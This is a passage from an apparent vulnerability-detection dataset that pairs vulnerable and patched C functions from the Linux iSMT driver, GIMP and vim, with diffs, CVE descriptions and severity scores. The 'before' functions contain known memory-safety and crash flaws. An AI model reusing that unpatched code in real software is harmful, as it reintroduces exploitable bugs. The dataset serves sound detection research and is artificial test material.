			dma_size = 1;
			dma_direction = DMA_FROM_DEVICE;
			desc->rd_len = 1;
		}
		break;

	case I2C_SMBUS_BYTE_DATA:
		if (read_write == I2C_SMBUS_WRITE) {
			/*
			 * Write Byte
			 * Command plus 1 data byte
			 */
			dev_dbg(dev, ""I2C_SMBUS_BYTE_DATA:  WRITE\n"");
			desc->wr_len_cmd = 2;
			dma_size = 2;
			dma_direction = DMA_TO_DEVICE;
			dma_buffer[0] = command;
			dma_buffer[1] = data->byte;
		} else {
			/* Read Byte */
			dev_dbg(dev, ""I2C_SMBUS_BYTE_DATA:  READ\n"");
			desc->control |= ISMT_DESC_CWRL;
			desc->wr_len_cmd = command;
			desc->rd_len = 1;
			dma_size = 1;
			dma_direction = DMA_FROM_DEVICE;
		}
		break;

	case I2C_SMBUS_WORD_DATA:
		if (read_write == I2C_SMBUS_WRITE) {
			/* Write Word */
			dev_dbg(dev, ""I2C_SMBUS_WORD_DATA:  WRITE\n"");
			desc->wr_len_cmd = 3;
			dma_size = 3;
			dma_direction = DMA_TO_DEVICE;
			dma_buffer[0] = command;
			dma_buffer[1] = data->word & 0xff;
			dma_buffer[2] = data->word >> 8;
		} else {
			/* Read Word */
			dev_dbg(dev, ""I2C_SMBUS_WORD_DATA:  READ\n"");
			desc->wr_len_cmd = command;
			desc->control |= ISMT_DESC_CWRL;
			desc->rd_len = 2;
			dma_size = 2;
			dma_direction = DMA_FROM_DEVICE;
		}
		break;

	case I2C_SMBUS_PROC_CALL:
		dev_dbg(dev, ""I2C_SMBUS_PROC_CALL\n"");
		desc->wr_len_cmd = 3;
		desc->rd_len = 2;
		dma_size = 3;
		dma_direction = DMA_BIDIRECTIONAL;
		dma_buffer[0] = command;
		dma_buffer[1] = data->word & 0xff;
		dma_buffer[2] = data->word >> 8;
		break;

	case I2C_SMBUS_BLOCK_DATA:
		if (read_write == I2C_SMBUS_WRITE) {
			/* Block Write */
			dev_dbg(dev, ""I2C_SMBUS_BLOCK_DATA:  WRITE\n"");
			dma_size = data->block[0] + 1;
			dma_direction = DMA_TO_DEVICE;
			desc->wr_len_cmd = dma_size;
			desc->control |= ISMT_DESC_BLK;
			dma_buffer[0] = command;
			memcpy(&dma_buffer[1], &data->block[1], dma_size - 1);
		} else {
			/* Block Read */
			dev_dbg(dev, ""I2C_SMBUS_BLOCK_DATA:  READ\n"");
			dma_size = I2C_SMBUS_BLOCK_MAX;
			dma_direction = DMA_FROM_DEVICE;
			desc->rd_len = dma_size;
			desc->wr_len_cmd = command;
			desc->control |= (ISMT_DESC_BLK | ISMT_DESC_CWRL);
		}
		break;

	case I2C_SMBUS_BLOCK_PROC_CALL:
		dev_dbg(dev, ""I2C_SMBUS_BLOCK_PROC_CALL\n"");
		if (data->block[0] > I2C_SMBUS_BLOCK_MAX)
			return -EINVAL;

		dma_size = I2C_SMBUS_BLOCK_MAX;
		desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, 1);
		desc->wr_len_cmd = data->block[0] + 1;
		desc->rd_len = dma_size;
		desc->control |= ISMT_DESC_BLK;
		dma_direction = DMA_BIDIRECTIONAL;
		dma_buffer[0] = command;
		memcpy(&dma_buffer[1], &data->block[1], data->block[0]);
		break;

	case I2C_SMBUS_I2C_BLOCK_DATA:
		/* Make sure the length is valid */
		if (data->block[0] < 1)
			data->block[0] = 1;

		if (data->block[0] > I2C_SMBUS_BLOCK_MAX)
			data->block[0] = I2C_SMBUS_BLOCK_MAX;

		if (read_write == I2C_SMBUS_WRITE) {
			/* i2c Block Write */
			dev_dbg(dev, ""I2C_SMBUS_I2C_BLOCK_DATA:  WRITE\n"");
			dma_size = data->block[0] + 1;
			dma_direction = DMA_TO_DEVICE;
			desc->wr_len_cmd = dma_size;
			desc->control |= ISMT_DESC_I2C;
			dma_buffer[0] = command;
			memcpy(&dma_buffer[1], &data->block[1], dma_size - 1);
		} else {
			/* i2c Block Read */
			dev_dbg(dev, ""I2C_SMBUS_I2C_BLOCK_DATA:  READ\n"");
			dma_size = data->block[0];
			dma_direction = DMA_FROM_DEVICE;
			desc->rd_len = dma_size;
			desc->wr_len_cmd = command;
			desc->control |= (ISMT_DESC_I2C | ISMT_DESC_CWRL);
			/*
			 * Per the ""Table 15-15. I2C Commands"",
			 * in the External Design Specification (EDS),
			 * (Document Number: 508084, Revision: 2.0),
			 * the _rw bit must be 0
			 */
			desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, 0);
		}
		break;

	default:
		dev_err(dev, ""Unsupported transaction %d\n"",
			size);
		return -EOPNOTSUPP;
	}

	/* map the data buffer */
	if (dma_size != 0) {
		dev_dbg(dev, "" dev=%p\n"", dev);
		dev_dbg(dev, "" data=%p\n"", data);
		dev_dbg(dev, "" dma_buffer=%p\n"", dma_buffer);
		dev_dbg(dev, "" dma_size=%d\n"", dma_size);
		dev_dbg(dev, "" dma_direction=%d\n"", dma_direction);

		dma_addr = dma_map_single(dev,
				      dma_buffer,
				      dma_size,
				      dma_direction);

		if (dma_mapping_error(dev, dma_addr)) {
			dev_err(dev, ""Error in mapping dma buffer %p\n"",
				dma_buffer);
			return -EIO;
		}

		dev_dbg(dev, "" dma_addr = %pad\n"", &dma_addr);

		desc->dptr_low = lower_32_bits(dma_addr);
		desc->dptr_high = upper_32_bits(dma_addr);
	}

	reinit_completion(&priv->cmp);

	/* Add the descriptor */
	ismt_submit_desc(priv);

	/* Now we wait for interrupt completion, 1s */
	time_left = wait_for_completion_timeout(&priv->cmp, HZ*1);

	/* unmap the data buffer */
	if (dma_size != 0)
		dma_unmap_single(dev, dma_addr, dma_size, dma_direction);

	if (unlikely(!time_left)) {
		dev_err(dev, ""completion wait timed out\n"");
		ret = -ETIMEDOUT;
		goto out;
	}

	/* do any post processing of the descriptor here */
	ret = ismt_process_desc(desc, data, priv, size, read_write);

out:
	/* Update the ring pointer */
	priv->head++;
	priv->head %= ISMT_DESC_ENTRIES;

	return ret;
}","static int ismt_access(struct i2c_adapter *VAR_0, u16 VAR_1,
		       unsigned short VAR_2, char VAR_3, u8 VAR_4,
		       int VAR_5, union i2c_smbus_data *VAR_6)
{
	int VAR_7;
	unsigned long VAR_8;
	dma_addr_t VAR_9 = 0; /* COMMENT_0 */
	u8 VAR_10 = 0;
	enum dma_data_direction VAR_11 = 0;
	struct ismt_desc *VAR_12;
	struct ismt_priv *VAR_13 = i2c_get_adapdata(VAR_0);
	struct device *VAR_14 = &VAR_13->pci_dev->dev;
	u8 *VAR_15 = PTR_ALIGN(&VAR_13->buffer[0], 16);

	VAR_12 = &VAR_13->hw[VAR_13->head];

	/* COMMENT_1 */
	memset(VAR_13->buffer, 0, sizeof(VAR_13->buffer));

	/* COMMENT_2 */
	memset(VAR_12, 0, sizeof(struct ismt_desc));
	VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, VAR_3);

	/* COMMENT_3 */
	memset(VAR_13->log, 0, VAR_16 * sizeof(VAR_17));

	/* COMMENT_4 */
	if (likely(pci_dev_msi_enabled(VAR_13->pci_dev)))
		VAR_12->control = VAR_18 | VAR_19;
	else
		VAR_12->control = VAR_19;

	if ((VAR_2 & VAR_20) && (VAR_5 != VAR_21)
	    && (VAR_5 != VAR_22))
		VAR_12->control |= VAR_23;

	switch (VAR_5) {
	case VAR_21:
		dev_dbg(VAR_14, ""I2C_SMBUS_QUICK\n"");
		break;

	case VAR_24:
		if (VAR_3 == VAR_25) {
			/* COMMENT_5 */
               
                                               
      
			dev_dbg(VAR_14, ""I2C_SMBUS_BYTE:  WRITE\n"");
			VAR_12->control |= VAR_26;
			VAR_12->wr_len_cmd = VAR_4;
		} else {
			/* COMMENT_9 */
			dev_dbg(VAR_14, ""I2C_SMBUS_BYTE:  READ\n"");
			VAR_10 = 1;
			VAR_11 = VAR_27;
			VAR_12->rd_len = 1;
		}
		break;

	case VAR_28:
		if (VAR_3 == VAR_25) {
			/* COMMENT_10 */
                
                              
      
			dev_dbg(VAR_14, ""I2C_SMBUS_BYTE_DATA:  WRITE\n"");
			VAR_12->wr_len_cmd = 2;
			VAR_10 = 2;
			VAR_11 = VAR_29;
			VAR_15[0] = VAR_4;
			VAR_15[1] = VAR_6->byte;
		} else {
			/* COMMENT_14 */
			dev_dbg(VAR_14, ""I2C_SMBUS_BYTE_DATA:  READ\n"");
			VAR_12->control |= VAR_26;
			VAR_12->wr_len_cmd = VAR_4;
			VAR_12->rd_len = 1;
			VAR_10 = 1;
			VAR_11 = VAR_27;
		}
		break;

	case VAR_30:
		if (VAR_3 == VAR_25) {
			/* COMMENT_15 */
			dev_dbg(VAR_14, ""I2C_SMBUS_WORD_DATA:  WRITE\n"");
			VAR_12->wr_len_cmd = 3;
			VAR_10 = 3;
			VAR_11 = VAR_29;
			VAR_15[0] = VAR_4;
			VAR_15[1] = VAR_6->word & 0xff;
			VAR_15[2] = VAR_6->word >> 8;
		} else {
			/* COMMENT_16 */
			dev_dbg(VAR_14, ""I2C_SMBUS_WORD_DATA:  READ\n"");
			VAR_12->wr_len_cmd = VAR_4;
			VAR_12->control |= VAR_26;
			VAR_12->rd_len = 2;
			VAR_10 = 2;
			VAR_11 = VAR_27;
		}
		break;

	case VAR_31:
		dev_dbg(VAR_14, ""I2C_SMBUS_PROC_CALL\n"");
		VAR_12->wr_len_cmd = 3;
		VAR_12->rd_len = 2;
		VAR_10 = 3;
		VAR_11 = VAR_32;
		VAR_15[0] = VAR_4;
		VAR_15[1] = VAR_6->word & 0xff;
		VAR_15[2] = VAR_6->word >> 8;
		break;

	case VAR_33:
		if (VAR_3 == VAR_25) {
			/* COMMENT_17 */
			dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_DATA:  WRITE\n"");
			VAR_10 = VAR_6->block[0] + 1;
			VAR_11 = VAR_29;
			VAR_12->wr_len_cmd = VAR_10;
			VAR_12->control |= VAR_34;
			VAR_15[0] = VAR_4;
			memcpy(&VAR_15[1], &VAR_6->block[1], VAR_10 - 1);
		} else {
			/* COMMENT_18 */
			dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_DATA:  READ\n"");
			VAR_10 = VAR_35;
			VAR_11 = VAR_27;
			VAR_12->rd_len = VAR_10;
			VAR_12->wr_len_cmd = VAR_4;
			VAR_12->control |= (VAR_34 | VAR_26);
		}
		break;

	case VAR_36:
		dev_dbg(VAR_14, ""I2C_SMBUS_BLOCK_PROC_CALL\n"");
		if (VAR_6->block[0] > VAR_35)
			return -VAR_37;

		VAR_10 = VAR_35;
		VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, 1);
		VAR_12->wr_len_cmd = VAR_6->block[0] + 1;
		VAR_12->rd_len = VAR_10;
		VAR_12->control |= VAR_34;
		VAR_11 = VAR_32;
		VAR_15[0] = VAR_4;
		memcpy(&VAR_15[1], &VAR_6->block[1], VAR_6->block[0]);
		break;

	case VAR_22:
		/* COMMENT_19 */
		if (VAR_6->block[0] < 1)
			VAR_6->block[0] = 1;

		if (VAR_6->block[0] > VAR_35)
			VAR_6->block[0] = VAR_35;

		if (VAR_3 == VAR_25) {
			/* COMMENT_20 */
			dev_dbg(VAR_14, ""I2C_SMBUS_I2C_BLOCK_DATA:  WRITE\n"");
			VAR_10 = VAR_6->block[0] + 1;
			VAR_11 = VAR_29;
			VAR_12->wr_len_cmd = VAR_10;
			VAR_12->control |= VAR_38;
			VAR_15[0] = VAR_4;
			memcpy(&VAR_15[1], &VAR_6->block[1], VAR_10 - 1);
		} else {
			/* COMMENT_21 */
			dev_dbg(VAR_14, ""I2C_SMBUS_I2C_BLOCK_DATA:  READ\n"");
			VAR_10 = VAR_6->block[0];
			VAR_11 = VAR_27;
			VAR_12->rd_len = VAR_10;
			VAR_12->wr_len_cmd = VAR_4;
			VAR_12->control |= (VAR_38 | VAR_26);
			/* COMMENT_22 */
                                          
                                                 
                                               
                           
      
			VAR_12->tgtaddr_rw = ISMT_DESC_ADDR_RW(VAR_1, 0);
		}
		break;

	default:
		dev_err(VAR_14, ""Unsupported transaction %d\n"",
			VAR_5);
		return -VAR_39;
	}

	/* COMMENT_28 */
	if (VAR_10 != 0) {
		dev_dbg(VAR_14, "" dev=%p\n"", VAR_14);
		dev_dbg(VAR_14, "" data=%p\n"", VAR_6);
		dev_dbg(VAR_14, "" dma_buffer=%p\n"", VAR_15);
		dev_dbg(VAR_14, "" dma_size=%d\n"", VAR_10);
		dev_dbg(VAR_14, "" dma_direction=%d\n"", VAR_11);

		VAR_9 = dma_map_single(VAR_14,
				      VAR_15,
				      VAR_10,
				      VAR_11);

		if (dma_mapping_error(VAR_14, VAR_9)) {
			dev_err(VAR_14, ""Error in mapping dma buffer %p\n"",
				VAR_15);
			return -VAR_40;
		}

		dev_dbg(VAR_14, "" dma_addr = %pad\n"", &VAR_9);

		VAR_12->dptr_low = lower_32_bits(VAR_9);
		VAR_12->dptr_high = upper_32_bits(VAR_9);
	}

	reinit_completion(&VAR_13->cmp);

	/* COMMENT_29 */
	ismt_submit_desc(VAR_13);

	/* COMMENT_30 */
	VAR_8 = wait_for_completion_timeout(&VAR_13->cmp, VAR_41*1);

	/* COMMENT_31 */
	if (VAR_10 != 0)
		dma_unmap_single(VAR_14, VAR_9, VAR_10, VAR_11);

	if (unlikely(!VAR_8)) {
		dev_err(VAR_14, ""completion wait timed out\n"");
		VAR_7 = -VAR_42;
		goto out;
	}

	/* COMMENT_32 */
	VAR_7 = ismt_process_desc(VAR_12, VAR_6, VAR_13, VAR_5, VAR_3);

out:
	/* COMMENT_33 */
	VAR_13->head++;
	VAR_13->head %= VAR_43;

	return VAR_7;
}",torvalds/linux/690b2549b19563ec5ad53e5c82f6a944d910086e/i2c-ismt.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -135,6 +135,9 @@
 
 	case I2C_SMBUS_BLOCK_PROC_CALL:
 		dev_dbg(dev, ""I2C_SMBUS_BLOCK_PROC_CALL\n"");
+		if (data->block[0] > I2C_SMBUS_BLOCK_MAX)
+			return -EINVAL;
+
 		dma_size = I2C_SMBUS_BLOCK_MAX;
 		desc->tgtaddr_rw = ISMT_DESC_ADDR_RW(addr, 1);
 		desc->wr_len_cmd = data->block[0] + 1;","{'deleted_lines': [], 'added_lines': ['\t\tif (data->block[0] > I2C_SMBUS_BLOCK_MAX)', '\t\t\treturn -EINVAL;', '']}",True,A buffer overflow vulnerability was found in the Linux kernel Intels iSMT SMBus host controller driver in the way it handled the I2C_SMBUS_BLOCK_PROC_CALL case (via the ioctl I2C_SMBUS) with malicious input data. This flaw could allow a local user to crash the system.,5.5,MEDIUM,1,valid,2022-06-02T11:02:18Z,4
CVE-2022-32990,['CWE-755'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,GNOME/gimp,"app: fix #8230 crash in gimp_layer_invalidate_boundary when channel is NULL

gimp_channel_is_empty returns FALSE if channel is NULL. This causes
gimp_layer_invalidate_boundary to crash if the mask channel is NULL.

With a NULL channel gimp_channel_is_empty should return TRUE, just like
the similar gimp_image_is_empty does, because returning FALSE here
suggests we have a non empty channel.",22af0bcfe67c1c86381f33975ca7fdbde6b36b39,https://github.com/GNOME/gimp/commit/22af0bcfe67c1c86381f33975ca7fdbde6b36b39,app/core/gimpchannel.c,gimp_channel_is_empty,"gboolean
gimp_channel_is_empty (GimpChannel *channel)
{
g_return_val_if_fail (GIMP_IS_CHANNEL (channel), FALSE);
return GIMP_CHANNEL_GET_CLASS (channel)->is_empty (channel);
}","gboolean
gimp_channel_is_empty (GimpChannel *VAR_0)
{
g_return_val_if_fail (GIMP_IS_CHANNEL (VAR_0), FALSE);
return GIMP_CHANNEL_GET_CLASS (VAR_0)->is_empty (VAR_0);
}",GNOME/gimp/22af0bcfe67c1c86381f33975ca7fdbde6b36b39/gimpchannel.c/vul/before/0.json,"gboolean
gimp_channel_is_empty (GimpChannel *channel)
{
  g_return_val_if_fail (GIMP_IS_CHANNEL (channel), TRUE);

  return GIMP_CHANNEL_GET_CLASS (channel)->is_empty (channel);
}","gboolean
gimp_channel_is_empty (GimpChannel *VAR_0)
{
  g_return_val_if_fail (GIMP_IS_CHANNEL (VAR_0), TRUE);

  return GIMP_CHANNEL_GET_CLASS (VAR_0)->is_empty (VAR_0);
}",GNOME/gimp/22af0bcfe67c1c86381f33975ca7fdbde6b36b39/gimpchannel.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
 gboolean
 gimp_channel_is_empty (GimpChannel *channel)
 {
-  g_return_val_if_fail (GIMP_IS_CHANNEL (channel), FALSE);
+  g_return_val_if_fail (GIMP_IS_CHANNEL (channel), TRUE);
 
   return GIMP_CHANNEL_GET_CLASS (channel)->is_empty (channel);
 }","{'deleted_lines': ['  g_return_val_if_fail (GIMP_IS_CHANNEL (channel), FALSE);'], 'added_lines': ['  g_return_val_if_fail (GIMP_IS_CHANNEL (channel), TRUE);']}",True,"An issue in gimp_layer_invalidate_boundary of GNOME GIMP 2.10.30 allows attackers to trigger an unhandled exception via a crafted XCF file, causing a Denial of Service (DoS).",5.5,MEDIUM,1,valid,2022-06-05T19:38:24Z,4
CVE-2022-2042,['CWE-416'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 8.2.5072: using uninitialized value and freed memory in spell command

Problem:    Using uninitialized value and freed memory in spell command.
Solution:   Initialize ""attr"".  Check for empty line early.",2813f38e021c6e6581c0c88fcf107e41788bc835,https://github.com/vim/vim/commit/2813f38e021c6e6581c0c88fcf107e41788bc835,src/spell.c,spell_move_to,"int
spell_move_to(
win_T*wp,
intdir,    intallwords,    intcurline,
hlf_T*attrp){
linenr_Tlnum;
pos_Tfound_pos;
intfound_len = 0;
char_u*line;
char_u*p;
char_u*endp;
hlf_Tattr;
intlen;
#ifdef FEAT_SYN_HL
inthas_syntax = syntax_present(wp);
#endif
intcol;
intcan_spell;
char_u*buf = NULL;
intbuflen = 0;
intskip = 0;
intcapcol = -1;
intfound_one = FALSE;
intwrapped = FALSE;
if (no_spell_checking(wp))
return 0;
lnum = wp->w_cursor.lnum;
CLEAR_POS(&found_pos);
while (!got_int)
{
line = ml_get_buf(wp->w_buffer, lnum, FALSE);
len = (int)STRLEN(line);
if (buflen < len + MAXWLEN + 2)
{
vim_free(buf);
buflen = len + MAXWLEN + 2;
buf = alloc(buflen);
if (buf == NULL)
break;
}
if (lnum == 1)
capcol = 0;
if (capcol == 0)
capcol = getwhitecols(line);
else if (curline && wp == curwin)
{
col = getwhitecols(line);
if (check_need_cap(lnum, col))
capcol = col;
line = ml_get_buf(wp->w_buffer, lnum, FALSE);
}
STRCPY(buf, line);
if (lnum < wp->w_buffer->b_ml.ml_line_count)
spell_cat_line(buf + STRLEN(buf),
ml_get_buf(wp->w_buffer, lnum + 1, FALSE), MAXWLEN);
p = buf + skip;
endp = buf + len;
while (p < endp)
{
if (dir == BACKWARD
&& lnum == wp->w_cursor.lnum
&& !wrapped
&& (colnr_T)(p - buf) >= wp->w_cursor.col)
break;
attr = HLF_COUNT;
len = spell_check(wp, p, &attr, &capcol, FALSE);
if (attr != HLF_COUNT)
{
if (allwords || attr == HLF_SPB)
{
if (dir == BACKWARD
|| lnum != wp->w_cursor.lnum
|| (wrapped
|| (colnr_T)(curline ? p - buf + len
: p - buf)
> wp->w_cursor.col))
{
#ifdef FEAT_SYN_HL
if (has_syntax)
{
col = (int)(p - buf);
(void)syn_get_id(wp, lnum, (colnr_T)col,
FALSE, &can_spell, FALSE);
if (!can_spell)
attr = HLF_COUNT;
}
else
#endif
can_spell = TRUE;
if (can_spell)
{
found_one = TRUE;
found_pos.lnum = lnum;
found_pos.col = (int)(p - buf);
found_pos.coladd = 0;
if (dir == FORWARD)
{
wp->w_cursor = found_pos;
vim_free(buf);
if (attrp != NULL)
*attrp = attr;
return len;
}
else if (curline)
found_pos.col += len;
found_len = len;
}
}
else
found_one = TRUE;
}
}
p += len;
capcol -= len;
}
if (dir == BACKWARD && found_pos.lnum != 0)
{
wp->w_cursor = found_pos;
vim_free(buf);
return found_len;
}
if (curline)
break;
if (lnum == wp->w_cursor.lnum && wrapped)
break;
if (dir == BACKWARD)
{
if (lnum > 1)
--lnum;
else if (!p_ws)
break;        else
{
lnum = wp->w_buffer->b_ml.ml_line_count;
wrapped = TRUE;
if (!shortmess(SHM_SEARCH))
give_warning((char_u *)_(top_bot_msg), TRUE);
}
capcol = -1;
}
else
{
if (lnum < wp->w_buffer->b_ml.ml_line_count)
++lnum;
else if (!p_ws)
break;        else
{
lnum = 1;
wrapped = TRUE;
if (!shortmess(SHM_SEARCH))
give_warning((char_u *)_(bot_top_msg), TRUE);
}
if (lnum == wp->w_cursor.lnum && !found_one)
break;
if (attr == HLF_COUNT)
skip = (int)(p - endp);
else
skip = 0;
--capcol;
if (*skipwhite(line) == NUL)
capcol = 0;
}
line_breakcheck();
}
vim_free(buf);
return 0;
}","int
spell_move_to(
win_T*VAR_0,
intVAR_1,
intVAR_2,
intVAR_3,
hlf_T*VAR_4)
{
linenr_TVAR_5;
pos_TVAR_6;
intVAR_7 = 0;
char_u*VAR_8;
char_u*VAR_9;
char_u*VAR_10;
hlf_TVAR_11;
intVAR_12;
#ifdef VAR_13
intVAR_14 = syntax_present(VAR_0);
#endif
intVAR_15;
intVAR_16;
char_u*VAR_17 = NULL;
intVAR_18 = 0;
intVAR_19 = 0;
intVAR_20 = -1;
intVAR_21 = FALSE;
intVAR_22 = FALSE;
if (no_spell_checking(VAR_0))
return 0;
VAR_5 = VAR_0->w_cursor.lnum;
CLEAR_POS(&VAR_6);
while (!VAR_23)
{
VAR_8 = ml_get_buf(VAR_0->w_buffer, VAR_5, FALSE);
VAR_12 = (int)STRLEN(VAR_8);
if (VAR_18 < VAR_12 + VAR_24 + 2)
{
vim_free(VAR_17);
VAR_18 = VAR_12 + VAR_24 + 2;
VAR_17 = alloc(VAR_18);
if (VAR_17 == NULL)
break;
}
if (VAR_5 == 1)
VAR_20 = 0;
if (VAR_20 == 0)
VAR_20 = getwhitecols(VAR_8);
else if (VAR_3 && VAR_0 == VAR_25)
{
VAR_15 = getwhitecols(VAR_8);
if (check_need_cap(VAR_5, VAR_15))
VAR_20 = VAR_15;
VAR_8 = ml_get_buf(VAR_0->w_buffer, VAR_5, FALSE);
}
STRCPY(VAR_17, VAR_8);
if (VAR_5 < VAR_0->w_buffer->b_ml.ml_line_count)
spell_cat_line(VAR_17 + STRLEN(VAR_17),
ml_get_buf(VAR_0->w_buffer, VAR_5 + 1, FALSE), VAR_24);
VAR_9 = VAR_17 + VAR_19;
VAR_10 = VAR_17 + VAR_12;
while (VAR_9 < VAR_10)
{
if (VAR_1 == VAR_26
&& VAR_5 == VAR_0->w_cursor.lnum
&& !VAR_22
&& (VAR_27)(VAR_9 - VAR_17) >= VAR_0->w_cursor.col)
break;
VAR_11 = VAR_28;
VAR_12 = spell_check(VAR_0, VAR_9, &VAR_11, &VAR_20, FALSE);
if (VAR_11 != VAR_28)
{
if (VAR_2 || VAR_11 == VAR_29)
{
if (VAR_1 == VAR_26
|| VAR_5 != VAR_0->w_cursor.lnum
|| (VAR_22
|| (VAR_27)(VAR_3 ? VAR_9 - VAR_17 + VAR_12
: VAR_9 - VAR_17)
> VAR_0->w_cursor.col))
{
#ifdef VAR_13
if (VAR_14)
{
VAR_15 = (int)(VAR_9 - VAR_17);
(void)syn_get_id(VAR_0, VAR_5, (colnr_T)VAR_15,
FALSE, &VAR_16, FALSE);
if (!VAR_16)
VAR_11 = VAR_28;
}
else
#endif
VAR_16 = TRUE;
if (VAR_16)
{
VAR_21 = TRUE;
VAR_6.lnum = VAR_5;
VAR_6.col = (int)(VAR_9 - VAR_17);
VAR_6.coladd = 0;
if (VAR_1 == VAR_30)
{
VAR_0->w_cursor = VAR_6;
vim_free(VAR_17);
if (VAR_4 != NULL)
*VAR_4 = VAR_11;
return VAR_12;
}
else if (VAR_3)
VAR_6.col += VAR_12;
VAR_7 = VAR_12;
}
}
else
VAR_21 = TRUE;
}
}
VAR_9 += VAR_12;
VAR_20 -= VAR_12;
}
if (VAR_1 == VAR_26 && VAR_6.lnum != 0)
{
VAR_0->w_cursor = VAR_6;
vim_free(VAR_17);
return VAR_7;
}
if (VAR_3)
break;
if (VAR_5 == VAR_0->w_cursor.lnum && VAR_22)
break;
if (VAR_1 == VAR_26)
{
if (VAR_5 > 1)
--VAR_5;
else if (!VAR_31)
break;    
else
{
VAR_5 = VAR_0->w_buffer->b_ml.ml_line_count;
VAR_22 = TRUE;
if (!shortmess(VAR_32))
give_warning((char_u *)_(VAR_33), TRUE);
}
VAR_20 = -1;
}
else
{
if (VAR_5 < VAR_0->w_buffer->b_ml.ml_line_count)
++VAR_5;
else if (!VAR_31)
break;    
else
{
VAR_5 = 1;
VAR_22 = TRUE;
if (!shortmess(VAR_32))
give_warning((char_u *)_(VAR_34), TRUE);
}
if (VAR_5 == VAR_0->w_cursor.lnum && !VAR_21)
break;
if (VAR_11 == VAR_28)
VAR_19 = (int)(VAR_9 - VAR_10);
else
VAR_19 = 0;
--VAR_20;
if (*skipwhite(VAR_8) == VAR_35)
VAR_20 = 0;
}
line_breakcheck();
}
vim_free(VAR_17);
return 0;
}",vim/2813f38e021c6e6581c0c88fcf107e41788bc835/spell.c/vul/before/0.json,"int
spell_move_to(
    win_T	*wp,
    int		dir,		// FORWARD or BACKWARD
    int		allwords,	// TRUE for ""[s""/""]s"", FALSE for ""[S""/""]S""
    int		curline,
    hlf_T	*attrp)		// return: attributes of bad word or NULL
				// (only when ""dir"" is FORWARD)
{
    linenr_T	lnum;
    pos_T	found_pos;
    int		found_len = 0;
    char_u	*line;
    char_u	*p;
    char_u	*endp;
    hlf_T	attr = 0;
    int		len;
#ifdef FEAT_SYN_HL
    int		has_syntax = syntax_present(wp);
#endif
    int		col;
    int		can_spell;
    char_u	*buf = NULL;
    int		buflen = 0;
    int		skip = 0;
    int		capcol = -1;
    int		found_one = FALSE;
    int		wrapped = FALSE;

    if (no_spell_checking(wp))
	return 0;

    /*
     * Start looking for bad word at the start of the line, because we can't
     * start halfway a word, we don't know where it starts or ends.
     *
     * When searching backwards, we continue in the line to find the last
     * bad word (in the cursor line: before the cursor).
     *
     * We concatenate the start of the next line, so that wrapped words work
     * (e.g. ""et<line-break>cetera"").  Doesn't work when searching backwards
     * though...
     */
    lnum = wp->w_cursor.lnum;
    CLEAR_POS(&found_pos);

    while (!got_int)
    {
	int empty_line;

	line = ml_get_buf(wp->w_buffer, lnum, FALSE);

	len = (int)STRLEN(line);
	if (buflen < len + MAXWLEN + 2)
	{
	    vim_free(buf);
	    buflen = len + MAXWLEN + 2;
	    buf = alloc(buflen);
	    if (buf == NULL)
		break;
	}

	// In first line check first word for Capital.
	if (lnum == 1)
	    capcol = 0;

	// For checking first word with a capital skip white space.
	if (capcol == 0)
	    capcol = getwhitecols(line);
	else if (curline && wp == curwin)
	{
	    // For spellbadword(): check if first word needs a capital.
	    col = getwhitecols(line);
	    if (check_need_cap(lnum, col))
		capcol = col;

	    // Need to get the line again, may have looked at the previous
	    // one.
	    line = ml_get_buf(wp->w_buffer, lnum, FALSE);
	}

	// Copy the line into ""buf"" and append the start of the next line if
	// possible.  Note: this ml_get_buf() may make ""line"" invalid, check
	// for empty line first.
	empty_line = *skipwhite(line) == NUL;
	STRCPY(buf, line);
	if (lnum < wp->w_buffer->b_ml.ml_line_count)
	    spell_cat_line(buf + STRLEN(buf),
			  ml_get_buf(wp->w_buffer, lnum + 1, FALSE), MAXWLEN);

	p = buf + skip;
	endp = buf + len;
	while (p < endp)
	{
	    // When searching backward don't search after the cursor.  Unless
	    // we wrapped around the end of the buffer.
	    if (dir == BACKWARD
		    && lnum == wp->w_cursor.lnum
		    && !wrapped
		    && (colnr_T)(p - buf) >= wp->w_cursor.col)
		break;

	    // start of word
	    attr = HLF_COUNT;
	    len = spell_check(wp, p, &attr, &capcol, FALSE);

	    if (attr != HLF_COUNT)
	    {
		// We found a bad word.  Check the attribute.
		if (allwords || attr == HLF_SPB)
		{
		    // When searching forward only accept a bad word after
		    // the cursor.
		    if (dir == BACKWARD
			    || lnum != wp->w_cursor.lnum
			    || (wrapped
				|| (colnr_T)(curline ? p - buf + len
						     : p - buf)
						  > wp->w_cursor.col))
		    {
#ifdef FEAT_SYN_HL
			if (has_syntax)
			{
			    col = (int)(p - buf);
			    (void)syn_get_id(wp, lnum, (colnr_T)col,
						    FALSE, &can_spell, FALSE);
			    if (!can_spell)
				attr = HLF_COUNT;
			}
			else
#endif
			    can_spell = TRUE;

			if (can_spell)
			{
			    found_one = TRUE;
			    found_pos.lnum = lnum;
			    found_pos.col = (int)(p - buf);
			    found_pos.coladd = 0;
			    if (dir == FORWARD)
			    {
				// No need to search further.
				wp->w_cursor = found_pos;
				vim_free(buf);
				if (attrp != NULL)
				    *attrp = attr;
				return len;
			    }
			    else if (curline)
				// Insert mode completion: put cursor after
				// the bad word.
				found_pos.col += len;
			    found_len = len;
			}
		    }
		    else
			found_one = TRUE;
		}
	    }

	    // advance to character after the word
	    p += len;
	    capcol -= len;
	}

	if (dir == BACKWARD && found_pos.lnum != 0)
	{
	    // Use the last match in the line (before the cursor).
	    wp->w_cursor = found_pos;
	    vim_free(buf);
	    return found_len;
	}

	if (curline)
	    break;	// only check cursor line

	// If we are back at the starting line and searched it again there
	// is no match, give up.
	if (lnum == wp->w_cursor.lnum && wrapped)
	    break;

	// Advance to next line.
	if (dir == BACKWARD)
	{
	    if (lnum > 1)
		--lnum;
	    else if (!p_ws)
		break;	    // at first line and 'nowrapscan'
	    else
	    {
		// Wrap around to the end of the buffer.  May search the
		// starting line again and accept the last match.
		lnum = wp->w_buffer->b_ml.ml_line_count;
		wrapped = TRUE;
